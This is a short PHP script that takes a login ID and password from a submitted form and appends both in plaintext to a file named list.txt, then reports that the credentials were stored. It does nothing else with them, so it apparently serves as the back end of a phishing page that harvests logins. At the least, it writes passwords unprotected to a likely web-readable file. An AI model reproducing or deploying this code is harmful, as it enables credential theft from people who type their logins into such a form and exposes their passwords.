<?php
// Retrieve form data
$login_id = $_POST['ID'];
$password = $_POST['PASS'];

// Validate input (optional but recommended)
if (!empty($login_id) && !empty($password)) {
    // Prepare the data to be saved
    $data = "Login ID: $login_id, Password: $password\n";

    // Save the data to list.txt
    file_put_contents('list.txt', $data, FILE_APPEND);

    // Redirect or display a success message
    echo "Credentials stored successfully.";
} else {
    echo "Please fill in both fields.";
}
?>